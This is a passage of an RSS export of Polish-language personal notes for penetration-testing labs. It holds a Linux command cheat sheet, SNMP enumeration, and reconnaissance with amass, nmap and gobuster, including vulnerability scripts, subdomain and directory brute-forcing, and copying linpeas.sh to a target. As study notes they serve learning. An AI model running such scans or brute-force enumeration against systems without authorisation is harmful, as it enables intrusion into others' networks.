<li>-l -listen (nasłuchuj na porcie, czekaj na przychodzące poączenia)</li>
<li>-v -verbose</li>
<li>-p  -numer portu</li>
</ul>
<p>nc -v IP PORT
nawiąż połączenie z IP:PORT</p>
<h2 id="ssh">ssh</h2>
<p>połączenie ssh
<a title="https://unix.stackexchange.com/questions/23291/how-to-ssh-to-remote-server-using-a-private-key" href="https://unix.stackexchange.com/questions/23291/how-to-ssh-to-remote-server-using-a-private-key">https://unix.stackexchange.com/questions/23291/how-to-ssh-to-remote-server-using-a-private-key</a></p>
<div><pre class="hljs"><code>ssh -<span class="hljs-selector-tag">p</span> <span class="hljs-number">1234</span> user<span class="hljs-keyword">@IP</span>/Hostaname</code></pre></div>
<ul>
<li>-i a.key -klucz prywatny użytkownika utworzony na hoście zdalnym (jeśli istnieje to można go skopiować do siebie, oddzielny plik, zmienić chmod 600, dodać jako argument do ssh )</li>
<li>-p port na którym się połączyć
można się zalogować nie wykonując .bashrc (plik uruchamiany przy starcie nowego terminala)</li>
</ul>
<ol>
<li>generaowanie klucza do połączenia bez hasła
lokalny komputer</li>
</ol>
<div><pre class="hljs"><code>ssh-keygen -f nazwa
<span class="hljs-keyword">chmod</span> <span class="hljs-number">600</span> ~<span class="hljs-regexp">/.ssh/na</span>zwa (id_rsa domyślnie)
<span class="hljs-keyword">chmod</span> <span class="hljs-number">600</span> ~<span class="hljs-regexp">/.ssh/na</span>zwa.pub (id_rsa.pub domyślnie)
<span class="hljs-keyword">chmod</span> <span class="hljs-number">700</span> ~/.ssh</code></pre></div>
<ol start="2">
<li>wysłać zawartość pliku nazwa.pub (klucz publiczny) do urządzenia do którego chce się dostać przez ssh (można użyć komendy albo wpisać ręcznie klucz do pliku)
<ul>
<li>wpisanie klucza publicznego do pliku
~/.ssh/authorized_keys</li>
</ul>
</li>
<li><strong>nie zapomnieć o nadaniu uprawnień</strong>
klucz prywatny musi być prywatny, nie pomylić uprawnień!
chmod 700 ~/.ssh   -mój folder może być w tylko przeze mnie
chmod 600 authorized_keys i ~/.ssh</li>
</ol>
<h2 id="scp">scp</h2>
<p>opcje jak w ssh (-i …)
kopiuje poprzez ssh
scp linpeas.sh paul@routerspace:.
scp (co,skąd) (gdzie)
kopia <strong>pliku</strong> z lokalnej maszyny do zdalne z zachowanem nazwy pliku</p>
<div><pre class="hljs"><code>scp <span class="hljs-regexp">/home/u</span>ser_name<span class="hljs-regexp">/filename user_name@IP_zdalne:/</span>home<span class="hljs-regexp">/user_name/</span></code></pre></div>
<p>kopia <strong>pliku</strong> z lokalnej maszyny do zdalne ze zmianą nazwy nowego pliku</p>
<div><pre class="hljs"><code>scp /home/user_name/filename user_name<span class="hljs-variable">@IP_zdalne</span><span class="hljs-symbol">:/home/user_name/new_filename</span></code></pre></div>
<p>kopia <strong>folderu</strong> z lokalnej maszyny do zdalne z zachowanem nazwy</p>
<div><pre class="hljs"><code>scp /home/user_name/directoryname user_name<span class="hljs-variable">@IP_zdalne</span><span class="hljs-symbol">:/home/user_name</span></code></pre></div>
<p>kopia <strong>folderu</strong> z lokalnej maszyny do zdalne ze zmianą nazwy</p>
<div><pre class="hljs"><code>scp /home/user_name/directoryname user_name<span class="hljs-variable">@IP_zdalne</span><span class="hljs-symbol">:/home/user_name/new_directoryname</span></code></pre></div>
<h2 id="find">find</h2>
<div><pre class="hljs"><code><span class="hljs-title">find</span> /(gdzie) -<span class="hljs-keyword">type</span> f ...(jakie właściwości)</code></pre></div>
<ul>
<li>
<p>-not -neguje następny filtr</p>
</li>
<li>
<p>-name/iname -nazwa/case insensitive</p>
</li>
<li>
<p>-regex -filename pasuje do regex (cała scieżka bezwzględna się liczy)</p>
</li>
<li>
<p>-type -typ</p>
<ul>
<li>b  – block special file</li>
<li>c  – character special file</li>
<li>d  – directory</li>
<li>f  – normal file</li>
<li>l  – symbolic link</li>
<li>p  – named pipe</li>
<li>s  – socket</li>
</ul>
</li>
<li>
<p>-executable -pliki wykonywalne i foldery, które można przeszukać</p>
</li>
<li>
<p>-size</p>
<ul>
<li>+n     for greater than n,</li>
<li>-n     for less than n,</li>
<li>n      for exactly n.</li>
<li>c -bajt (1 char)</li>
<li>w -2 byte words</li>
<li>k -kilo</li>
<li>M -mega</li>
<li>G -giga</li>
</ul>
</li>
<li>
<p>-user -właściciel</p>
</li>
<li>
<p>-group -grupa</p>
</li>
<li>
<p>-perm -permisions</p>
</li>
</ul>
<h2 id="unique">unique</h2>
<ul>
<li>-c -zlicza ilość wartości
trzeba wcześniej sortować, inaczej nie zadziała</li>
</ul>
<h2 id="base64">base64</h2>
<p>base64 encode/decode data and print to standard output
-d -decode</p>
<h2 id="tr">tr</h2>
<p>translate/delete chars</p>
<div><pre class="hljs"><code><span class="hljs-keyword">echo</span> daniel | <span class="hljs-keyword">tr</span> <span class="hljs-string">'a-z'</span> <span class="hljs-string">'A-Z'</span></code></pre></div>
<p>zmieni wszystko w plku daniel na duze litery</p>
<h2 id="sed">sed</h2>
<p>Stream EDitor</p>
<div><pre class="hljs"><code>sed -i <span class="hljs-string">'s/word1/word2/g'</span> <span class="hljs-built_in">input</span>.txt
## you can <span class="hljs-keyword">change</span> the delimiter <span class="hljs-keyword">to</span> keep <span class="hljs-keyword">syntax</span> simple <span class="hljs-built_in">or</span> use <span class="hljs-string">"/"</span> in searched word
sed -i <span class="hljs-string">'s+word1+word/2+g'</span> <span class="hljs-built_in">input</span>.txt
sed -i <span class="hljs-string">'s_word1_word2_g'</span> <span class="hljs-built_in">input</span>.txt</code></pre></div>
<ul>
<li>-i -in place</li>
<li>-E  -use extended regular expressions</li>
<li>s/ is the substitute command of sed for find and replace
find all occurrences of ‘old-text’ and replace with ‘new-text’ in a file named input.txt (plik zostaje zamieniony w miejscu)</li>
<li>/g -global replace i.e. find all occurrences of foo and replace with bar using sed. If you removed the /g only first occurrence is changed.</li>
</ul>
<p>Replace strings in files with bash string manipulation operators only</p>
<div><pre class="hljs"><code><span class="hljs-symbol">$</span>{<span class="hljs-keyword">variable</span>/pattern/string}
${<span class="hljs-keyword">variable</span>/find/replace}
#Find <span class="hljs-comment">and replace all occurrences #</span>
${<span class="hljs-keyword">variable</span><span class="hljs-comment">//pattern/string}</span></code></pre></div>
<h2 id="file">file</h2>
<p>info na temat pliku</p>
<h2 id="open_ssl">open_ssl</h2>
<p>connect IP:Port</p>
<h2 id="mkdir">mkdir</h2>
<ul>
<li>-p make parent directory jeśli podana jest nie istniejąca ścierzka do tworzonego folderu</li>
</ul>
<h2 id="diff">diff</h2>
<p>pokaż różnice  w plikach
diff file1 file2</p>
<h2 id="comm">comm</h2>
<p>porównaj pliki</p>
<div><pre class="hljs"><code><span class="hljs-attribute">comm</span> file1 file2 </code></pre></div>
<ul>
<li>-1/2/3/12/13/23 -nie wyświetlaj odpowiednich kolumn (1-plik1, 2-plik2, 3-część wspólna)</li>
</ul>
<h2 id="crontab">crontab</h2>
<p>@reboot -wykonaj polecenie po każdym reboocie</p>
<ul>
<li>-e -edit user job</li>
<li>-l -list user jobs</li>
<li>-r -delete all user jobs</li>
<li>-i -prompt before del job</li>
</ul>
<h2 id="sha256">sha256</h2>
<p>sha256 file1
checksum of file</p>
<h2 id="grep">grep</h2>
<div><pre class="hljs"><code><span class="hljs-keyword">grep</span> expresion <span class="hljs-keyword">file</span></code></pre></div>
<p>extract lines from file</p>
<ul>
<li>–invert-match / -i -odwrócone szukanie-wskazuje to co <strong>nie</strong> zawiera</li>
</ul>
<h2 id="ps">ps</h2>
<p>list shell proceses</p>
<ul>
<li>-e -every process</li>
</ul>
<h2 id="kill-pid">kill PID</h2>
<p>kill process</p>
<h2 id="bgfg-jobs">bg/fg / jobs</h2>
<p>send process to background/foreground / show shell bg jobs</p>
<h2 id="chownchgrpchmodchattr">chown/chgrp/chmod/chattr</h2>
<p>owner/group/rights/attributes of file</p>
<h2 id="strings">strings</h2>
<p>print the sequences of printable characters in files</p>
<h2 id="which">which</h2>
<p>finds the binary executable of the program (if it is in your PATH).</p>
<h2 id="whereis">whereis</h2>
<p>whereis command also searches for programs that are not present in the PATH setting</p>
<h2 id="curl">curl</h2>
<p>pobiera zawartość z linku</p>
<div><pre class="hljs"><code>curl --silent http:<span class="hljs-regexp">//</span>late</code></pre></div>
<ul>
<li>–silent -nie wyświetlaj paska postępu</li>
<li>-o <em>nazwa_pliku</em> -zapisz plik pod nazwą <em>nazwa_pliku</em></li>
</ul>
<h2 id="sudo">sudo</h2>
<ul>
<li>-l -list user’s privileges or check a specific command; use twice for longer format</li>
</ul>
<h2 id="exiftool">exiftool</h2>
<p>pozwala na manipulację obrazami, zmianę metadanych itd.</p>
<div><pre class="hljs"><code>exiftool -Artist<span class="hljs-operator">=</span><span class="hljs-string">"tekst"</span>  clean0.png</code></pre></div>
<p>tagi: <a title="https://exiftool.org/TagNames/" href="https://exiftool.org/TagNames/">https://exiftool.org/TagNames/</a>
magic numbers / file signatures: <a title="https://en.wikipedia.org/wiki/List_of_file_signatures" href="https://en.wikipedia.org/wiki/List_of_file_signatures">https://en.wikipedia.org/wiki/List_of_file_signatures</a></p>
<h2 id="exec">exec</h2>
<p>is used to spawn a process that will overtake current process’s PID</p>
<h2 id="ln">ln</h2>
<p>create link</p>
<div><pre class="hljs"><code><span class="hljs-symbol">ln</span> <span class="hljs-built_in">f1</span> <span class="hljs-built_in">f2</span></code></pre></div>
<p>utwórz link do f1 o nazwie f2</p>
<div><pre class="hljs"><code><span class="hljs-symbol">ln</span> -s <span class="hljs-built_in">f1</span> <span class="hljs-built_in">f2</span> </code></pre></div>
<p>-s -symbolic link</p>
<h2></h2>
<h2 id="-2"></h2>
<h2 id="-3"></h2>
<h2 id="-4"></h2>
<h2 id="-5"></h2>
<h2 id="-6"></h2>
<h2 id="-7"></h2>
<h2 id="-8"></h2>
<h2 id="-9"></h2>
<h2 id="-10"></h2>
<h2 id="-11"></h2>
<h2 id="-12"></h2>
<h2 id="-13"></h2>
<h2 id="-14"></h2>
<h2 id="-15"></h2>
<h2 id="-16"></h2>
<h2 id="-17"></h2>
<h2 id="-18"></h2>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[SNMP]]></title>
            <guid>ebad133e75994862afb05ea184c1bc52</guid>
            <pubDate>Fri, 27 May 2022 12:18:46 GMT</pubDate>
            <content:encoded><![CDATA[<h1 id="snmp">SNMP</h1>
<p>protokół wymiany danych między urządzeniami sieciowymi</p>
<p>snmpwalk -v (1/2c/3) -c public IP
snmpbulkwalk -||- . - kropka na końcu jest ważna</p>
<p>trzeba zainstalować snmp MIBS
install snmp-mibs-downloader
i zakomentować linię
mib
w pliku /etc/snmp/snmp.conf</p>
<h2 id="dalesze-szukanie-danych">dalesze szukanie danych</h2>
<p>w tym co znalazł snmpbulkwalk zastosować
grep -Eo “:[a-zA-Z0-9]*.” | sort | uniq
pokaże poszczególne dane i można tam znaleć procesy i inne ciekawe rzeczy</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Skanowanie maszyny]]></title>
            <guid>cc5e9bd83e5146c0901aea85a656c5c2</guid>
            <pubDate>Fri, 27 May 2022 11:44:00 GMT</pubDate>
            <content:encoded><![CDATA[<h1 id="amass">amass</h1>
<p><a title="https://github.com/OWASP/Amass/blob/master/doc/user_guide.md" href="https://github.com/OWASP/Amass/blob/master/doc/user_guide.md">https://github.com/OWASP/Amass/blob/master/doc/user_guide.md</a></p>
<h2 id="enum">enum</h2>
<p>for subdomain enumeration. Perform DNS enumeration and network mapping of systems exposed to the Internet
przeszukuje opensource bazy danych w poszukwaniu domen, czy domeny są osiągalne, pokazuje tylko adresy które są osiągalne,<br />
Typical parameters for DNS enumeration:</p>
<div><pre class="hljs"><code>amass <span class="hljs-keyword">enum</span> -v -src -ip -brute -<span class="hljs-built_in">min</span>-for-<span class="hljs-keyword">recursive</span> <span class="hljs-number">2</span> -d example.com</code></pre></div>
<div><pre class="hljs"><code>amass <span class="hljs-keyword">enum</span> -d *domain* -src -ip -dir directory_to_save</code></pre></div>
<ul>
<li>-src -pokaż skąd są dane</li>
<li>-ip -chcę widzieć adresy ip znalezionego każdego celu</li>
<li>-brute -bruteforce nazwy subdomen, DNS bruteforce wordlist : <em>/usr/share/amass/wordlists</em></li>
<li>-dir -dir do którego zapisujemy wyniki</li>
</ul>
<h2 id="intel">intel</h2>
<p>Collect open source intelligence for investigation of the target organization</p>
<div><pre class="hljs"><code>amas <span class="hljs-built_in">int</span>el -asn numer_ASN_z_enum</code></pre></div>
<ul>
<li>-asn -An Autonomous System (AS) is a group of one or more IP prefixes (lists of IP addresses accessible on a network) run by one or more network operators that maintain a single, clearly-defined routing policy. Network operators need Autonomous System Numbers (ASNs) to control routing within their networks and to exchange routing information with other Internet Service Providers (ISPs).</li>
</ul>
<h3 id="reverse-whois-lookup">reverse whois lookup</h3>
<p>amass intel -whois -d globomantics.com -dir</p>
<h2 id="viz">viz</h2>
<p>Generate visualizations of enumerations for exploratory analysis</p>
<h2 id="track">track</h2>
<p>Compare results of enumerations against common target organizations</p>
<h2 id="db">db</h2>
<p>Manage the graph databases storing the enumeration results</p>
<h1></h1>
<h1 id="2-początkowe-skanowanie">2. Początkowe skanowanie</h1>
<div><pre class="hljs"><code><span class="hljs-attribute">nmap</span> -p <span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">80</span>,<span class="hljs-number">443</span> <span class="hljs-number">10.10.56.0</span>/<span class="hljs-number">24</span>
<span class="hljs-attribute">nmap</span> <span class="hljs-number">192.168.18.10</span>-<span class="hljs-number">25</span>
<span class="hljs-attribute">nmap</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.*.<span class="hljs-number">10</span>
<span class="hljs-attribute">nmap</span> localhost
<span class="hljs-attribute">nmap</span> -iL targets.txt</code></pre></div>
<p>znajdź wszystkie hosty z podanego zakresu mające otwarte porty p, wypróbuje każdy adres z puli, * zastąpi liczbami 0-255</p>
<div><pre class="hljs"><code><span class="hljs-comment">* -iL -read target specifications from file</span>
<span class="hljs-comment">* -F - top 100 ports</span>
<span class="hljs-comment">* -T -speed of scan (0-5)</span></code></pre></div>
<p><strong>1.  host discovery</strong> w sieci</p>
<div><pre class="hljs"><code><span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">sn</span> IP
<span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">sn</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">0.1</span>-<span class="hljs-number">254</span> **lub** <span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">sn</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">24</span></code></pre></div>
<p><strong>2.  port scan</strong></p>
<div><pre class="hljs"><code>nmap -p- --<span class="hljs-built_in">min</span>-rate=<span class="hljs-number">1000</span> IP
nmap -sU -p- --<span class="hljs-built_in">min</span>-rate=<span class="hljs-number">1000</span> IP

<span class="hljs-comment">* -sS domyślnie skan  -niepełny 3 way handshake, stealth("nie zauważalny tak po chuju bo pakiety są puste i podejrzane, zwykły skan mniej się rzuca w oczy")</span>
<span class="hljs-comment">* -sT -skanowanie z pełnym 3 way handshake</span>
<span class="hljs-comment">* -sU skan UDP</span>
<span class="hljs-comment">* -p- -wszystkie porty</span>
<span class="hljs-comment">* --open: Only show open (or possibly open) ports</span>
<span class="hljs-comment">* --min-rate=1000 1000 pakietów na s</span>
<span class="hljs-comment">* --top-ports 20 -20 najczęstrzych portów</span></code></pre></div>
<p><strong>2. Dalsze skanowanie portów</strong>
nmap -p {wcześniej znalezione porty} IP -vv -sC -sV</p>
<ul>
<li>-vv verbose- więcej “v”, więcej opisu</li>
<li>-sC - --script=default</li>
<li>-sV -service version</li>
<li>-O -OS detection</li>
<li>-oN/-oX/-oS/-oG/-oA <file class="jop-noMdConv"> -wynik skanowania zapisany w foramtach normal, XML, s|rIpt kIddi3, grepable format, w 3 pierwszych foramtach na raz i nazwa pliku</file></li>
<li>–script=  <strong>(folder ze skryptami /usr/share/nmap/scripts)</strong>
<ul>
<li>vuln</li>
<li>smb-enum-shares (enumerate smb shares)</li>
<li>smb-vuln-ms-010 - czy serwer jest wrażliwy na podatność Eternal Blue</li>
<li>ftp-anon (FTP anonymous login)</li>
<li>http-title</li>
</ul>
</li>
<li>–open</li>
<li>-A -agresive</li>
</ul>
<h1 id="4-gobuster">4. gobuster</h1>
<p>ma trzy dostępne tryby: „dns”, „dir” i „vhost”. Służą one odpowiednio do brute force zgadywania subdomen, katalogów i plików oraz wirtualnych hostów.
<a title="https://github.com/OJ/gobuster" href="https://github.com/OJ/gobuster">https://github.com/OJ/gobuster</a></p>
<h2 id="globalne-flagi">globalne flagi</h2>
<ul>
<li>-t, --threads int			  -Number of concurrent threads (default 10)</li>
<li>-w, --wordlist string   -Path to the wordlist</li>
<li>–no-error          Don’t display errors</li>
<li>-z, --no-progress		   -Don’t display progress</li>
<li>-v -verbose</li>
<li>-q, --quiet					-Don’t print the banner and other noise (errors)</li>
</ul>
<h2 id="1-dir-mode">1. DIR mode</h2>
<div><pre class="hljs"><code>gobuster dir -u <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span> -w <span class="hljs-tag">&lt;<span class="hljs-name">wordlist_file.txt</span>&gt;</span> -x <span class="hljs-tag">&lt;<span class="hljs-name">file_extensions</span>&gt;</span></code></pre></div>
<ul>
<li>-u -target url, np artcorp.htb</li>
<li>-w -wordlist:
<ol>
<li>/usr/share/dirbuster/…</li>
<li>/usr/share/seclist/…</li>
</ol>
</li>
<li>-x -include file type</li>
</ul>
<h2 id="2-vhost">2. VHOST</h2>
<div><pre class="hljs"><code>gobuster vhost -w <span class="hljs-tag">&lt;<span class="hljs-name">wordlist.txt</span>&gt;</span> -u <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span> -o <span class="hljs-tag">&lt;<span class="hljs-name">output_file.txt</span>&gt;</span></code></pre></div>
<p>wirtualne hosty na aserwerze http (na jednym hostingu, serwerze można wyświetlać kilka stron)</p>
<h2 id="3-dns">3. DNS</h2>
<hr />
<p>jakieś skrypty, nie wiem o co chodzi ale nie kasuję</p>
<div><pre class="hljs"><code><span class="hljs-keyword">for</span> el <span class="hljs-keyword">in</span> *;<span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$el</span>;gobuster dns -d artcorp.htb -t 1000 -w <span class="hljs-variable">$el</span> -q ; <span class="hljs-keyword">done</span></code></pre></div>
<div><pre class="hljs"><code><span class="hljs-meta">#!/bin/bash</span>
lista=$(find . -<span class="hljs-built_in">type</span> f )
<span class="hljs-keyword">for</span> el <span class="hljs-keyword">in</span> <span class="hljs-variable">$lista</span>
<span class="hljs-keyword">do</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"DNS - file: <span class="hljs-variable">$el</span>"</span>
        gobuster dns -d artcorp.htb -t 1000 -w <span class="hljs-variable">$el</span> -q &gt;&gt; daniel.txt
<span class="hljs-keyword">done</span>
</code></pre></div>
<div><pre class="hljs"><code>gobuster dir -u http:<span class="hljs-regexp">//</span>artcorp.htb -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/dirbuster/</span>wordlists/directory-list-<span class="hljs-number">2.3</span>-medium.txt -t <span class="hljs-number">50</span> -x .txt,.html,.php --no-error</code></pre></div>
]]></content:encoded>
        </item>
    </channel>
</rss>